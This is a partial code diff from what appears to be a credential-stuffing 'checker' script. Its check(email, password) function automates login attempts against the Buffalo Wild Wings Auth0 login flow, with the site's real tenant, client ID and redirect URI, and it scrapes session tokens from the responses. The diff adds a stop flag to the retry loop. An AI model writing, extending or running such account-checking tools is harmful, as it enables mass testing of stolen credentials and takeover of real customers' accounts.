@@ -7,7 +7,7 @@ from requests.adapters import HTTPAdapter, Retry
 import json, functools
 
 def check(email:str,password:str):
-    while 1:
+    while not Checker.stopping:
         try:
             with Session() as s:
                 s.request = functools.partial(s.request, timeout=Checker.timeout)
@@ -39,6 +39,7 @@ def check(email:str,password:str):
                     return
                 elif "wresult" not in r.text:
                     raise
+                
                 sid = r.text.split('sid&#34;:&#34;')[1].split('&#34;,&#34;realm')[0]
                 wc = quote(json.dumps({"strategy":"auth0","auth0Client":"eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTYuNCJ9","tenant":"bww-prd01","connection":"firebase-auth","client_id":"mLLAi6nx8PX5OykSkTBG79aw5SkfIdKG","response_type":"code","scope":"openid offline_access","redirect_uri":"https://www.buffalowildwings.com/callback","state":state,"sid":sid,"realm":"firebase-auth"}))
                 tk = soup(r.text, 'html.parser').find('input',{'name':'wresult'})['value']
